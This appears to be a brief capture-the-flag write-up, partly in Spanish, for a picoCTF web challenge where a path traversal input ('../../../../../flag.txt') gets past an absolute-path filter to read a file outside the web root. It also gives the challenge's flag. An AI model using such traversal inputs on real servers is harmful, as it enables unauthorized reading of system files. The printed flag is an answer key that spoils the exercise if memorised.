## forbidden paths

# objetivo
- Can you get the flag? Here's the [website](http://saturn.picoctf.net:49700/). We know that the website files live in `/usr/share/nginx/html/` and the flag is at `/flag.txt` but the website is filtering absolute file paths. Can you get past the filter to read the flag?

# Hints
- 

# solucion
``` bash 
segui la ruta, poniendo ../ hasta llegar a la direccion de la bandera
../../../../../flag.txt
```
# bandera
- picoCTF{7h3_p47h_70_5ucc355_6db46514}